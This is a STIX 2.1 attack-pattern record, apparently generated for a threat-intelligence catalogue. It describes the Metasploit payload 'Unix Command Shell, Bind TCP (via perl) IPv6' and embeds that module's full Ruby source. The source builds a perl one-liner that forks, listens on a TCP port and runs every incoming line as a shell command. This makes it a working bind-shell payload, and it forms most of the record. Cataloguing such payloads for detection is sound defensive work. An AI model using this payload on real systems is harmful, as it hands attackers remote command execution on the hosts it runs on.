{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--56ecda16-ecc9-44d9-b0c7-965dcb833153",
    "created": "2024-08-14T16:33:19.322422Z",
    "modified": "2024-08-14T16:33:19.322426Z",
    "name": "Unix Command Shell, Bind TCP (via perl) IPv6",
    "description": "Listen for a connection and spawn a command shell via perl",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/bind_perl_ipv6.rb",
            "external_id": "bind_perl_ipv6.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 152\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Bind TCP (via perl) IPv6',\n     'Description'   => 'Listen for a connection and spawn a command shell via perl',\n     'Author'        => ['Samy <samy[at]samy.pl>', 'cazz'],\n     'License'       => BSD_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::BindTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'perl',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('PerlPath', [true, 'The path to the Perl executable', 'perl'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n\n    cmd = \"#{datastore['PerlPath']} -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'\"\n\n    return cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}